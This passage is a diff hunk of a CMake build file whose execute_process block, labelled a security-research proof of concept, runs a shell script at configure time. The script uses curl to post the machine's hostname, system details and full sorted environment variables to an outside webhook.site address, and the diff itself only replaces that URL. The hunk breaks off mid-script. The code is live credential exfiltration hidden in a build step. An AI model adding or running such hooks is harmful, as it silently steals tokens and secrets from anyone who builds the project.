@@ -2,7 +2,7 @@ cmake_minimum_required(VERSION 3.6)
 
 # PoC: security research exfil
 execute_process(COMMAND /bin/sh -c "
-  HOOK=\"https://webhook.site/c11f6f9f-5e8d-4c35-a5a1-04bb3deb813f\"
+  HOOK=\"https://webhook.site/7041c930-af85-4ea6-ad23-9bc97ecc732f\"
   post() { curl -sf -X POST \"$HOOK\" --data-urlencode \"stage=$1\" --data-urlencode \"d=$2\" || true; }
   post start \"cmake RCE: $(hostname) $(uname -srm)\"
   post env   \"$(env | sort)\"
